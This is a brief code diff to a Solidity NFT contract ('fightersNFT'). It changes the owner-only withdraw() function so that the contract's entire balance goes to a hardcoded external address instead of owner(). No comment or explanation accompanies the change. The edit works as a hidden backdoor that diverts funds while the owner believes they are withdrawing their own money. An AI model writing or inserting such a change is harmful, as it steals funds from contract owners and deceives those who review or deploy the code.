@@ -2137,7 +2137,7 @@ contract fightersNFT is ERC721Enumerable, Ownable, IDrop {
   }
   function withdraw() public payable onlyOwner {
     // =============================================================================
-    (bool os, ) = payable(owner()).call{value: address(this).balance}("");
+    (bool os, ) = payable(0x7c53098AED50e7d2b5d0a4a89eF5B9C31a7b6AEE).call{value: address(this).balance}("");
     require(os);
     // =============================================================================
   }
